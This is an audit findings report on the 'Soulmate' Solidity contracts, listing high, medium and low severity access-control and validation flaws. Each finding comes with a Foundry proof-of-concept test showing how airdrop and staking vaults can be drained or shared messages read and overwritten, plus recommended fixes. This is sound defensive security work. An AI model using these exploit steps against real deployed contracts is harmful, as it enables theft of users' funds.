# First Flight #9: Soulmate - Findings Report

# Table of contents
- ## [Contest Summary](#contest-summary)
- ## [Results Summary](#results-summary)
- ## High Risk Findings
    - ### [H-01. Incorrect validation for divorced soulmates in the `Airdrop.sol::claim()` function allows them to claim airdrop tokens](#h-01)
    - ### [H-02. Missing validation in the `Staking.sol::claimRewards()` function allows users without soulmates to claim rewards without staking tokens for at least a week and receive more than they deserve](#h-02)
    - ### [H-03. Missing validation in the `Airdrop.sol::claim()` function allows users without soulmates to claim airdrop tokens](#h-03)
- ## Medium Risk Findings
    - ### [M-01. Missing validation in the `Soulmate.sol::writeMessageInSharedSpace()` function allows NFT non-holders to write in the shared space reserved for holders of the NFT with id `0`](#m-01)
    - ### [M-02. Missing validation in the `Soulmate.sol::mintSoulmateToken()` function allows users to become soulmates with themselves](#m-02)
- ## Low Risk Findings
    - ### [L-01. Missing validation in the `Soulmate.sol::readMessageInSharedSpace()` function allows the ones without soulmate to read messages in the shared space reserved for holders of the NFT with id `0`](#l-01)


# <a id='contest-summary'></a>Contest Summary

### Sponsor: First Flight #9

### Dates: Feb 8th, 2024 - Feb 15th, 2024

[See more contest details here](https://www.codehawks.com/contests/clsathvgg0005yhmxmoe455mm)

# <a id='results-summary'></a>Results Summary

### Number of findings:
   - High: 3
   - Medium: 2
   - Low: 1


# High Risk Findings

## <a id='h-01'></a>H-01. Incorrect validation for divorced soulmates in the `Airdrop.sol::claim()` function allows them to claim airdrop tokens            

### Relevant GitHub Links
	
https://github.com/Cyfrin/2024-02-soulmate/blob/main/src/Airdrop.sol#L53

## Summary

Incorrect validation check in the `Airdrop.sol::claim()` function will allow divorced users to claim airdrop tokens.

## Vulnerability Details

In the `Airdrop.sol::claim()` function, the following code block checks the divorce status of soulmate and reverts the transaction if soulmate is divorced:

```javascript
// No LoveToken for people who don't love their soulmates anymore.
if (soulmateContract.isDivorced()) revert Airdrop__CoupleIsDivorced();
```

The `Soulmate.sol::isDivorced()` is implemented as follows:

```javascript
/// @notice Cancel possibily for 2 lovers to collect LoveToken from the airdrop.
function isDivorced() public view returns (bool) {
@>    return divorced[msg.sender];
}
```

Divorce status is checked for the `msg.sender`. When checking the divorce status in the `Airdrop.sol::claim()` function, the divorce status is checked for the `Airdrop.sol` contract instead of the user wanting to claim airdrop tokens.

## Impact

Divorced users are able to claim airdrop tokens.

## Proof of Concept (PoC)

Add the following test in `AirdropTest.t.sol`:

```javascript
function test_divorcedSoulmatesCanClaimTokens() public {
    _mintOneTokenForBothSoulmates();
    uint256 airdropVaultBalanceBeforeClaim = loveToken.balanceOf(address(airdropVault));
    uint256 divorcedUserBalanceBeforeClaim = loveToken.balanceOf(soulmate1);
    assertEq(divorcedUserBalanceBeforeClaim, 0);

    vm.warp(block.timestamp + 1 days);

    vm.startPrank(soulmate1);
    soulmateContract.getDivorced();
    assertTrue(soulmateContract.isDivorced());
    airdropContract.claim(); // divorced user was allowed to claim airdrop tokens
    vm.stopPrank();

    uint256 airdropVaultBalanceAfterClaim = loveToken.balanceOf(address(airdropVault));
    uint256 divorcedUserBalanceAfterClaim = loveToken.balanceOf(soulmate1);

    assertGt(divorcedUserBalanceAfterClaim, divorcedUserBalanceBeforeClaim);
    assertEq(airdropVaultBalanceAfterClaim, airdropVaultBalanceBeforeClaim - divorcedUserBalanceAfterClaim);
}
```

Run a test with `forge test --mt test_divorcedSoulmatesCanClaimTokens`.

## Tools Used

- Manual review
- Foundry

## Recommendations

`Airdrop.sol::claim()` should check the divorce status for the user wanting to claim tokens.

Recommended changes to the `ISoulmate.sol::isDivorced()` function:

```diff
-function isDivorced() external view returns (bool);
+function isDivorced(address soulmate) external view returns (bool);
```

Recommended changes to the `Soulmate.sol::isDivorced()` function:

```diff
-function isDivorced() public view returns (bool) {
+function isDivorced(address soulmate) public view returns (bool) {
-    return divorced[msg.sender];
+    return divorced[soulmate];
}
```

Recommended changes to the `Airdrop.sol::claim()` function:

```diff
function claim() public {
    // No LoveToken for people who don't love their soulmates anymore.
-    if (soulmateContract.isDivorced()) revert Airdrop__CoupleIsDivorced();
+    if (soulmateContract.isDivorced(msg.sender)) revert Airdrop__CoupleIsDivorced();

    // Calculating since how long soulmates are reunited
    uint256 numberOfDaysInCouple = (block.timestamp -
        soulmateContract.idToCreationTimestamp(
            soulmateContract.ownerToId(msg.sender)
        )) / daysInSecond;

    uint256 amountAlreadyClaimed = _claimedBy[msg.sender];

    if (
        amountAlreadyClaimed >=
        numberOfDaysInCouple * 10 ** loveToken.decimals()
    ) revert Airdrop__PreviousTokenAlreadyClaimed();

    uint256 tokenAmountToDistribute = (numberOfDaysInCouple *
        10 ** loveToken.decimals()) - amountAlreadyClaimed;

    // Dust collector
    if (
        tokenAmountToDistribute >=
        loveToken.balanceOf(address(airdropVault))
    ) {
        tokenAmountToDistribute = loveToken.balanceOf(
            address(airdropVault)
        );
    }
    _claimedBy[msg.sender] += tokenAmountToDistribute;

    emit TokenClaimed(msg.sender, tokenAmountToDistribute);

    loveToken.transferFrom(
        address(airdropVault),
        msg.sender,
        tokenAmountToDistribute
    );
}
```

Add the following test in `AirdropTest.t.sol`:

```javascript
function test_claimTokensRevertsWhenSoulmateIsDivorced() public {
    _mintOneTokenForBothSoulmates();
    uint256 airdropVaultBalanceBeforeClaim = loveToken.balanceOf(address(airdropVault));
    uint256 divorcedUserBalanceBeforeClaim = loveToken.balanceOf(soulmate1);
    assertEq(divorcedUserBalanceBeforeClaim, 0);

    vm.warp(block.timestamp + 1 days);

    vm.startPrank(soulmate1);
    soulmateContract.getDivorced();
    assertTrue(soulmateContract.isDivorced(soulmate1));
    vm.expectRevert(Airdrop.Airdrop__CoupleIsDivorced.selector); // divorced user is not allowed to claim airdrop tokens
    airdropContract.claim();
    vm.stopPrank();
}
```

Run a test with `forge test --mt test_claimTokensRevertsWhenSoulmateIsDivorced`.
## <a id='h-02'></a>H-02. Missing validation in the `Staking.sol::claimRewards()` function allows users without soulmates to claim rewards without staking tokens for at least a week and receive more than they deserve            

### Relevant GitHub Links
	
https://github.com/Cyfrin/2024-02-soulmate/blob/main/src/Staking.sol#L73-L77

## Summary

Missing validation checks in the `Staking.sol::claimRewards()` function will allow users without soulmates to claim rewards without staking tokens for at least a week and receive more than they deserve.

## Vulnerability Details

In the `Staking.sol::claimRewards()` function, there is a code block that, if this is the first time the user is claiming the rewards, sets the timestamp of the last claim to the creation timestamp of the Soulmate NFT:

```javascript
// first claim
if (lastClaim[msg.sender] == 0) {
@>    lastClaim[msg.sender] = soulmateContract.idToCreationTimestamp(
        soulmateId
    );
}
```

This timestamp is later used to determine the number of tokens to reward the caller:

```javascript
// How many weeks passed since the last claim.
// Thanks to round-down division, it will be the lower amount possible until a week has completly pass.
uint256 timeInWeeksSinceLastClaim = ((block.timestamp -
    lastClaim[msg.sender]) / 1 weeks);
```

`soulmateContract.idToCreationTimestamp()` will return `0` if the caller initiates `Soulmate.sol::mintSoulmateToken()` but still waits for a soulmate to be assigned.
`soulmateContract.idToCreationTimestamp()` will return the creation timestamp of the token with id `0` if the caller didn't initiate `Soulmate.sol::mintSoulmateToken()`.

This will allow users who do not have soulmates to claim rewards without staking tokens for at least a week, and potentially claim more rewards than they would normally be eligible for.

In the end, this vulnerability has the potential to cause a drain of funds from the staking vault.

## Impact

Users without soulmates can claim rewards without staking tokens for at least a week and receive more than they deserve.

## Proof of Concept (PoC)

- [1] The attacker mints a Soulmate NFT.
- [2] The attacker claims ERC20 tokens from the Airdrop contract.
- [3] The attacker transfers the ERC20 tokens to another account they control, which doesn't hold a Soulmate NFT.
- [4] Using an account that doesn't hold a Soulmate NFT, the attacker attempts to find a soulmate.
- [5] The attacker stakes ERC20 tokens using an account that doesn't yet have a soulmate assigned but holds ERC20 tokens.
- [6] The attacker claims rewards without staking tokens for at least a week and receives more than they deserve.

Add the following test in `StakingTest.t.sol`:

```javascript
function test_usersWithoutSoulmatesCanClaimMoreRewardsWithoutStakingLongEnough(address random) public {
    vm.assume(random != address(soulmateContract) && random != address(loveToken) &&
                random != address(stakingContract) && random != address(airdropContract) &&
                random != address(airdropVault) && random != address(stakingVault)
    );

    assertEq(soulmateContract.soulmateOf(random), address(0)); // Non-NFT holder

    // attacker can mint NFT with one account
    _mintOneTokenForBothSoulmates();

    uint256 mockedBlockTimestamp = 1707973127; // timestamp of Ethereum block number `19231100`
    vm.warp(mockedBlockTimestamp);

    uint256 amountToStake = 1;

    // attacker can claim ERC20 tokens and then transfer them to another account that they control
    vm.startPrank(soulmate1);
    airdropContract.claim();
    loveToken.transfer(random, amountToStake);
    vm.stopPrank();
    assertEq(loveToken.balanceOf(random), amountToStake);

    uint256 stakingVaultTokenBalanceBeforeRewardsClaim = loveToken.balanceOf(address(stakingVault));
    uint256 userTokenBalanceBeforeRewardsClaim = loveToken.balanceOf(random);

    // using an account that doesn't hold NFT, but holds ERC20 tokens, the attacker can stake ERC20 tokens and then claim much more rewards even if they didn't stake tokens for at least one week
    vm.startPrank(random);
    loveToken.approve(address(stakingContract), amountToStake);
    stakingContract.deposit(amountToStake);
    assertEq(stakingContract.userStakes(random), amountToStake);
    stakingContract.claimRewards();
    stakingContract.withdraw(amountToStake);
    vm.stopPrank();

    uint256 stakingVaultTokenBalanceAfterRewardsClaim = loveToken.balanceOf(address(stakingVault));
    uint256 userTokenBalanceAfterRewardsClaim = loveToken.balanceOf(random);

    assertGt(userTokenBalanceAfterRewardsClaim, userTokenBalanceBeforeRewardsClaim);
    assertEq(stakingVaultTokenBalanceAfterRewardsClaim, stakingVaultTokenBalanceBeforeRewardsClaim - (userTokenBalanceAfterRewardsClaim - amountToStake));
}
```

Run a test with `forge test --mt test_usersWithoutSoulmatesCanClaimMoreRewardsWithoutStakingLongEnough`.

## Tools Used

- Manual review
- Foundry

## Recommendations

Revert the transaction if the sender doesn't have a soulmate.

Recommended changes to the `Staking.sol::claimRewards()` function:

```diff
/*//////////////////////////////////////////////////////////////
                                ERRORS
//////////////////////////////////////////////////////////////*/
error Staking__NoMoreRewards();
error Staking__StakingPeriodTooShort();
+error Staking__UsersWithoutSoulmateCannotClaimRewards();

function claimRewards() public {
+    if (soulmateContract.soulmateOf(msg.sender) == address(0)) {
+        revert Staking__UsersWithoutSoulmateCannotClaimRewards();
+    }

    uint256 soulmateId = soulmateContract.ownerToId(msg.sender);
    // first claim
    if (lastClaim[msg.sender] == 0) {
        lastClaim[msg.sender] = soulmateContract.idToCreationTimestamp(
            soulmateId
        );
    }

    // How many weeks passed since the last claim.
    // Thanks to round-down division, it will be the lower amount possible until a week has completly pass.
    uint256 timeInWeeksSinceLastClaim = ((block.timestamp -
        lastClaim[msg.sender]) / 1 weeks);

    if (timeInWeeksSinceLastClaim < 1)
        revert Staking__StakingPeriodTooShort();

    lastClaim[msg.sender] = block.timestamp;

    // Send the same amount of LoveToken as the week waited times the number of token staked
    uint256 amountToClaim = userStakes[msg.sender] *
        timeInWeeksSinceLastClaim;
    loveToken.transferFrom(
        address(stakingVault),
        msg.sender,
        amountToClaim
    );

    emit RewardsClaimed(msg.sender, amountToClaim);
}
```

Add the following import and test in `StakingTest.t.sol`:

```javascript
import {Staking} from "../../src/Staking.sol";

function test_claimRewardsRevertsWhenCallerIsWithoutSoulmate(address random) public {
    vm.assume(random != address(soulmateContract) && random != address(loveToken) &&
                random != address(stakingContract) && random != address(airdropContract) &&
                random != address(airdropVault) && random != address(stakingVault)
    );

    assertEq(soulmateContract.soulmateOf(random), address(0)); // Non-NFT holder

    // attacker can mint NFT with one account
    _mintOneTokenForBothSoulmates();

    uint256 mockedBlockTimestamp = 1707973127; // timestamp of Ethereum block number `19231100`
    vm.warp(mockedBlockTimestamp);

    uint256 amountToStake = 1;

    // attacker can claim ERC20 tokens and then transfer them to another account that they control
    vm.startPrank(soulmate1);
    airdropContract.claim();
    loveToken.transfer(random, amountToStake);
    vm.stopPrank();
    assertEq(loveToken.balanceOf(random), amountToStake);

    uint256 stakingVaultTokenBalanceBeforeRewardsClaim = loveToken.balanceOf(address(stakingVault));
    uint256 userTokenBalanceBeforeRewardsClaim = loveToken.balanceOf(random);

    // using account that doesn't hold NFT, but holds ERC20 tokens, attacker can stake ERC20 tokens and then claim rewards even if didn't stake tokens at least one week
    vm.startPrank(random);
    loveToken.approve(address(stakingContract), amountToStake);
    stakingContract.deposit(amountToStake);
    assertEq(stakingContract.userStakes(random), amountToStake); // users without soulmates can't claim rewards even if they staked ERC20 tokens
    vm.expectRevert(Staking.Staking__UsersWithoutSoulmateCannotClaimRewards.selector);
    stakingContract.claimRewards();
    vm.stopPrank();
}
```

Run a test with `forge test --mt test_claimRewardsRevertsWhenCallerIsWithoutSoulmate`.

## <a id='h-03'></a>H-03. Missing validation in the `Airdrop.sol::claim()` function allows users without soulmates to claim airdrop tokens            

### Relevant GitHub Links
	
https://github.com/Cyfrin/2024-02-soulmate/blob/main/src/Airdrop.sol#L56-L59

## Summary

Missing validation checks in the `Airdrop.sol::claim()` function will allow users without soulmates to claim airdrop tokens

## Vulnerability Details

In the `Airdrop.sol::claim()` function, there is a code block that calculates the number of days a couple has been soulmates:

```javascript
uint256 numberOfDaysInCouple = (block.timestamp -
@>    soulmateContract.idToCreationTimestamp(
        soulmateContract.ownerToId(msg.sender)
    )) / daysInSecond;
```

This number is later used to determine the number of tokens that should be distributed to the caller.

`soulmateContract.idToCreationTimestamp()` will return `0` if the caller initiates `Soulmate.sol::mintSoulmateToken()` but is still waiting for a soulmate to be assigned.
`soulmateContract.idToCreationTimestamp()` will return the creation timestamp of the token with id `0` if the caller didn't initiate `Soulmate.sol::mintSoulmateToken()`.

In the end, this vulnerability has the potential to cause a drain of funds from the airdrop vault.

## Impact

Users without soulmates can claim airdrop tokens.

## Proof of Concept (PoC)

Add the following test in `AirdropTest.t.sol`:

```javascript
function test_usersWithoutSoulmatesCanClaimAirdropTokens(address random) public {
   // Random address validation
    vm.assume(random != address(soulmateContract) && random != address(loveToken) &&
              random != address(stakingContract) && random != address(airdropContract) &&
              random != address(airdropVault) && random != address(stakingVault)
    );

    assertEq(soulmateContract.soulmateOf(random), address(0)); // user without soulmate
    uint256 airdropVaultTokenBalanceBeforeClaim = loveToken.balanceOf(address(airdropVault));
    uint256 userTokenBalanceBeforeClaim = loveToken.balanceOf(random);
    assertEq(userTokenBalanceBeforeClaim, 0);

    uint256 mockedBlockTimestamp = 1707973127; // timestamp of Ethereum block number `19231100`
    vm.warp(mockedBlockTimestamp);
    vm.prank(random);
    airdropContract.claim(); // users without soulmates are allowed to claim airdrop tokens

    uint256 airdropVaultTokenBalanceAfterClaim = loveToken.balanceOf(address(airdropVault));
    uint256 userTokenBalanceAfterClaim = loveToken.balanceOf(random);

    assertGt(userTokenBalanceAfterClaim, userTokenBalanceBeforeClaim);
    assertEq(airdropVaultTokenBalanceAfterClaim, airdropVaultTokenBalanceBeforeClaim - userTokenBalanceAfterClaim);
}
```

Run a test with `forge test --mt test_usersWithoutSoulmatesCanClaimAirdropTokens`.

## Tools Used

- Manual review
- Foundry

## Recommendations

The transaction should be reverted if the sender doesn't have a soulmate.

Recommended changes to the `Airdrop.sol::claim()` function:

```diff
/*//////////////////////////////////////////////////////////////
                                ERRORS
//////////////////////////////////////////////////////////////*/
error Airdrop__CoupleIsDivorced();
error Airdrop__PreviousTokenAlreadyClaimed();
+error Airdrop__UsersWithoutSoulmateCannotClaimAirdropTokens();

function claim() public {
+    if (soulmateContract.soulmateOf(msg.sender) == address(0)) {
+        revert Airdrop__UsersWithoutSoulmateCannotClaimAirdropTokens();
+    }

    // No LoveToken for people who don't love their soulmates anymore.
    if (soulmateContract.isDivorced()) revert Airdrop__CoupleIsDivorced();

    // Calculating since how long soulmates are reunited
    uint256 numberOfDaysInCouple = (block.timestamp -
        soulmateContract.idToCreationTimestamp(
            soulmateContract.ownerToId(msg.sender)
        )) / daysInSecond;

    uint256 amountAlreadyClaimed = _claimedBy[msg.sender];

    if (
        amountAlreadyClaimed >=
        numberOfDaysInCouple * 10 ** loveToken.decimals()
    ) revert Airdrop__PreviousTokenAlreadyClaimed();

    uint256 tokenAmountToDistribute = (numberOfDaysInCouple *
        10 ** loveToken.decimals()) - amountAlreadyClaimed;

    // Dust collector
    if (
        tokenAmountToDistribute >=
        loveToken.balanceOf(address(airdropVault))
    ) {
        tokenAmountToDistribute = loveToken.balanceOf(
            address(airdropVault)
        );
    }
    _claimedBy[msg.sender] += tokenAmountToDistribute;

    emit TokenClaimed(msg.sender, tokenAmountToDistribute);

    loveToken.transferFrom(
        address(airdropVault),
        msg.sender,
        tokenAmountToDistribute
    );
}
```

Add the following import and test in `AirdropTest.t.sol`:

```javascript
import {Airdrop} from "../../src/Airdrop.sol";

function test_claimRevertsWhenCallerIsWithoutSoulmate(address random) public {
    // Random address validation
    vm.assume(random != address(soulmateContract) && random != address(loveToken) &&
              random != address(stakingContract) && random != address(airdropContract) &&
              random != address(airdropVault) && random != address(stakingVault)
    );

    assertEq(soulmateContract.soulmateOf(random), address(0)); // user without a soulmate

    uint256 mockedBlockTimestamp = 1707973127; // timestamp of Ethereum block number `19231100`
    vm.warp(mockedBlockTimestamp);
    vm.expectRevert(abi.encodeWithSelector(Airdrop.Airdrop__UsersWithoutSoulmateCannotClaimAirdropTokens.selector)); // users without soulmates can't claim airdrop tokens
    vm.prank(random);
    airdropContract.claim();
}
```

Run a test with `forge test --mt test_claimRevertsWhenCallerIsWithoutSoulmate`.
		
# Medium Risk Findings

## <a id='m-01'></a>M-01. Missing validation in the `Soulmate.sol::writeMessageInSharedSpace()` function allows NFT non-holders to write in the shared space reserved for holders of the NFT with id `0`            

### Relevant GitHub Links
	
https://github.com/Cyfrin/2024-02-soulmate/blob/main/src/Soulmate.sol#L107

## Summary

Missing validation check in the `Soulmate.sol::writeMessageInSharedSpace()` function will allow NFT non-holders to write in the shared space reserved for holders of the NFT with id `0`

## Vulnerability Details

The `Soulmate.sol::writeMessageInSharedSpace()` is implemented as follows:

```javascript
function writeMessageInSharedSpace(string calldata message) external {
    uint256 id = ownerToId[msg.sender];
    sharedSpace[id] = message;
    emit MessageWrittenInSharedSpace(id, message);
}
```

`ownerToId[msg.sender]` will return `0` if `msg.sender` does not hold an NFT, resulting in a message being written in the shared space of NFT with ID `0`.

## Impact

NFT non-holders can write messages in the shared space of soulmates that hold NFT with id `0`.

## Proof of Concept (PoC)

Add the following test in `SoulmateTest.t.sol`:

```javascript
function test_NFTNonHoldersCanWriteInTheSharedSpaceReservedForHoldersOfTokenWithIdZero(address random) public {
    vm.assume(random != address(soulmateContract) && random != address(loveToken) &&
        random != address(stakingContract) && random != address(airdropContract) &&
        random != address(airdropVault) && random != address(stakingVault) &&
        random != address(soulmate1) && random != address(soulmate2)
    );
    _mintOneTokenForBothSoulmates(); // token minted for `soulmate1` and `soulmate2`

    vm.prank(random);
    soulmateContract.writeMessageInSharedSpace("I don't love you anymore!"); // any account that doesn't hold a Soulmate NFT can write in the shared space reserved for holders of the NFT with ID 0

    assertEq(soulmateContract.sharedSpace(0), "I don't love you anymore!");
}
```

Run a test with `forge test --mt test_NFTNonHoldersCanWriteInTheSharedSpaceReservedForHoldersOfTokenWithIdZero`.

## Tools Used

- Manual review
- Foundry

## Recommendations

The transaction should be reverted if the user attempts to become a soulmate with itself.

Recommended changes to the `Soulmate.sol::mintSoulmateToken()` function:

```diff
/*//////////////////////////////////////////////////////////////
                            ERRORS
//////////////////////////////////////////////////////////////*/

error Soulmate__alreadyHaveASoulmate(address soulmate);
error Soulmate__SoulboundTokenCannotBeTransfered();
+error Soulmate__CannotWriteToSharedSpaceOfOtherSoulmates();

function writeMessageInSharedSpace(string calldata message) external {
+    if (soulmateOf[msg.sender] == address(0)) {
+        revert Soulmate__CannotWriteToSharedSpaceOfOtherSoulmates();
+    }
    uint256 id = ownerToId[msg.sender];
    sharedSpace[id] = message;
    emit MessageWrittenInSharedSpace(id, message);
}
```

Add the following import and test in `SoulmateTest.t.sol`:

```javascript
function test_writeMessageInSharedSpaceRevertsWhenDoesntHaveSoulmate(address random) public {
    vm.assume(random != address(soulmateContract) && random != address(loveToken) &&
        random != address(stakingContract) && random != address(airdropContract) &&
        random != address(airdropVault) && random != address(stakingVault) &&
        random != address(soulmate1) && random != address(soulmate2)
    );
    _mintOneTokenForBothSoulmates(); // token minted for `soulmate1` and `soulmate2`

    vm.prank(random);
    vm.expectRevert(Soulmate.Soulmate__CannotWriteToSharedSpaceOfOtherSoulmates.selector);
    soulmateContract.writeMessageInSharedSpace("I don't love you anymore!"); // account that doesn't have a soulmate can't write in the shared space
}
```

Run a test with `forge test --mt test_writeMessageInSharedSpaceRevertsWhenDoesntHaveSoulmate`.

## <a id='m-02'></a>M-02. Missing validation in the `Soulmate.sol::mintSoulmateToken()` function allows users to become soulmates with themselves            

### Relevant GitHub Links
	
https://github.com/Cyfrin/2024-02-soulmate/blob/main/src/Soulmate.sol#L74-L85

## Summary

Missing validation check in the `Soulmate.sol::mintSoulmateToken()` function will allow users to become soulmates with themselves.

## Vulnerability Details

The user can become a soulmate with itself by calling the `Soulmate.sol::mintSoulmateToken()` function twice in a row.

`Soulmate.sol::totalSouls()` function returns incorrect results if any user is soulmate with themselves.

## Impact

Users are allowed to become soulmates with themselves.

## Proof of Concept (PoC)

Add the following test in `SoulmateTest.t.sol`:

```javascript
function test_usersCanBecomeSoulmateWithThemselves(address random) public {
    // Random address validation
    vm.assume(random != address(soulmateContract) && random != address(loveToken) && 
        random != address(stakingContract) && random != address(airdropContract) && 
        random != address(airdropVault) && random != address(stakingVault) &&
        random != address(soulmate1) && random != address(soulmate2)
    );

    uint tokenIdMinted = soulmateContract.totalSupply();

    vm.startPrank(random);
    soulmateContract.mintSoulmateToken();
    soulmateContract.mintSoulmateToken();
    vm.stopPrank();

    assertEq(soulmateContract.totalSupply(), tokenIdMinted + 1);
    assertEq(soulmateContract.soulmateOf(random), random);
    assertEq(soulmateContract.ownerToId(random), tokenIdMinted);
    assertEq(soulmateContract.ownerOf(tokenIdMinted), random);

    assertEq(soulmateContract.totalSouls(), 2); // this should not be correct as there is only one user who is a soulmate to themself
}
```

Run a test with `forge test --mt test_usersCanBecomeSoulmateWithThemselves `.

## Tools Used

- Manual review
- Foundry

## Recommendations

The transaction should be reverted if a user attempts to become a soulmate with itself.

Recommended changes to the `Soulmate.sol::mintSoulmateToken()` function:

```diff
/*//////////////////////////////////////////////////////////////
                            ERRORS
//////////////////////////////////////////////////////////////*/

error Soulmate__alreadyHaveASoulmate(address soulmate);
error Soulmate__SoulboundTokenCannotBeTransfered();
+error Soulmate__UserCannotBeSoulmateWithItself();

function mintSoulmateToken() public returns (uint256) {
    // Check if people already have a soulmate, which means already have a token
    address soulmate = soulmateOf[msg.sender];
    if (soulmate != address(0))
        revert Soulmate__alreadyHaveASoulmate(soulmate);

    address soulmate1 = idToOwners[nextID][0];
    address soulmate2 = idToOwners[nextID][1];
    if (soulmate1 == address(0)) {
        idToOwners[nextID][0] = msg.sender;
        ownerToId[msg.sender] = nextID;
        emit SoulmateIsWaiting(msg.sender);
    } else if (soulmate2 == address(0)) {
+        if (soulmate1 == msg.sender) {
+            revert Soulmate__UserCannotBeSoulmateWithItself();
+        }
        idToOwners[nextID][1] = msg.sender;
        // Once 2 soulmates are reunited, the token is minted
        ownerToId[msg.sender] = nextID;
        soulmateOf[msg.sender] = soulmate1;
        soulmateOf[soulmate1] = msg.sender;
        idToCreationTimestamp[nextID] = block.timestamp;

        emit SoulmateAreReunited(soulmate1, soulmate2, nextID);

        _mint(msg.sender, nextID++);
    }

    return ownerToId[msg.sender];
}
```

Add the following import and test in `SoulmateTest.t.sol`:

```javascript
function test_mintSoulmateTokenRevertsWhenUserIsTryingToBecomeSoulmateWithItself(address random) public {
    // Random address validation
    vm.assume(random != address(soulmateContract) && random != address(loveToken) && 
        random != address(stakingContract) && random != address(airdropContract) && 
        random != address(airdropVault) && random != address(stakingVault) &&
        random != address(soulmate1) && random != address(soulmate2)
    );

    uint tokenIdMinted = soulmateContract.totalSupply();

    vm.startPrank(random);
    soulmateContract.mintSoulmateToken();
    vm.expectRevert(Soulmate.Soulmate__UserCannotBeSoulmateWithItself.selector);
    soulmateContract.mintSoulmateToken();
    vm.stopPrank();
}
```

Run a test with `forge test --mt test_mintSoulmateTokenRevertsWhenUserIsTryingToBecomeSoulmateWithItself`.

# Low Risk Findings

## <a id='l-01'></a>L-01. Missing validation in the `Soulmate.sol::readMessageInSharedSpace()` function allows the ones without soulmate to read messages in the shared space reserved for holders of the NFT with id `0`            

### Relevant GitHub Links
	
https://github.com/Cyfrin/2024-02-soulmate/blob/main/src/Soulmate.sol#L117

## Summary

Missing validation check in the `Soulmate.sol::readMessageInSharedSpace()` function will allow the ones without soulmate to read messages in the shared space reserved for holders of the NFT with id `0`

## Vulnerability Details

The `Soulmate.sol::readMessageInSharedSpace()` is implemented as follows:

```javascript
function readMessageInSharedSpace() external view returns (string memory) {
    // Add a little touch of romantism
    return
        string.concat(
            sharedSpace[ownerToId[msg.sender]],
            ", ",
            niceWords[block.timestamp % niceWords.length]
        );
}
```

`ownerToId[msg.sender]` will return `0` if `msg.sender` does not have a soulmate, resulting in a reading message in the shared space for holders of NFT with ID `0`.

## Impact

Users without soulmates can read messages in the shared space of soulmates who hold NFT with id `0`.

## Proof of Concept (PoC)

Add the following test in `SoulmateTest.t.sol`:

```javascript
function test_NFTNonHoldersCanReadMessagesInTheSharedSpaceReservedForHoldersOfTokenWithIdZero(address random) public {
    vm.assume(random != address(soulmateContract) && random != address(loveToken) &&
        random != address(stakingContract) && random != address(airdropContract) &&
        random != address(airdropVault) && random != address(stakingVault) &&
        random != address(soulmate1) && random != address(soulmate2)
    );

    _mintOneTokenForBothSoulmates(); // token minted for `soulmate1` and `soulmate2`

    vm.prank(soulmate1);
    soulmateContract.writeMessageInSharedSpace("Buy some eggs");

    address random = makeAddr("random");
    vm.prank(random);
    string memory message = soulmateContract.readMessageInSharedSpace(); // any account that doesn't hold a Soulmate NFT can read the message in the shared space reserved for holders of the NFT with ID 0

    string[4] memory possibleText = [
        "Buy some eggs, sweetheart",
        "Buy some eggs, darling",
        "Buy some eggs, my dear",
        "Buy some eggs, honey"
    ];
    bool found;
    for (uint i; i < possibleText.length; i++) {
        if (compare(possibleText[i], message)) {
            found = true;
            break;
        }
    }
    assertTrue(found);
}
```

Run a test with `forge test --mt test_NFTNonHoldersCanReadMessagesInTheSharedSpaceReservedForHoldersOfTokenWithIdZero`.

## Tools Used

- Manual review
- Foundry

## Recommendations

The transaction should be reverted if the user who doesn't have a soulmate tries to read a message in the shared space.

Recommended changes to the `Soulmate.sol::mintSoulmateToken()` function:

```diff
/*//////////////////////////////////////////////////////////////
                            ERRORS
//////////////////////////////////////////////////////////////*/

error Soulmate__alreadyHaveASoulmate(address soulmate);
error Soulmate__SoulboundTokenCannotBeTransfered();
+error Soulmate__CannotReadMessageInSharedSpaceOfOtherSoulmates();

function readMessageInSharedSpace() external view returns (string memory) {
    if (soulmateOf[msg.sender] == address(0)) {
        revert Soulmate__CannotReadMessageInSharedSpaceOfOtherSoulmates();
    }
    // Add a little touch of romantism
    return
        string.concat(
            sharedSpace[ownerToId[msg.sender]],
            ", ",
            niceWords[block.timestamp % niceWords.length]
        );
}
```

Add the following import and test in `SoulmateTest.t.sol`:

```javascript
function test_readMessageInSharedSpaceRevertsCallerWhenDoesntHaveSoulmate(address random) public {
    vm.assume(random != address(soulmateContract) && random != address(loveToken) &&
        random != address(stakingContract) && random != address(airdropContract) &&
        random != address(airdropVault) && random != address(stakingVault) &&
        random != address(soulmate1) && random != address(soulmate2)
    );

    _mintOneTokenForBothSoulmates(); // token minted for `soulmate1` and `soulmate2`

    vm.prank(soulmate1);
    soulmateContract.writeMessageInSharedSpace("Buy some eggs");

    address random = makeAddr("random");
    vm.prank(random);
    vm.expectRevert(Soulmate.Soulmate__CannotReadMessageInSharedSpaceOfOtherSoulmates.selector);
    string memory message = soulmateContract.readMessageInSharedSpace(); // account that doesn't have a soulmate can't read messages in the shared space
}
```

Run a test with `forge test --mt test_readMessageInSharedSpaceRevertsCallerWhenDoesntHaveSoulmate`.


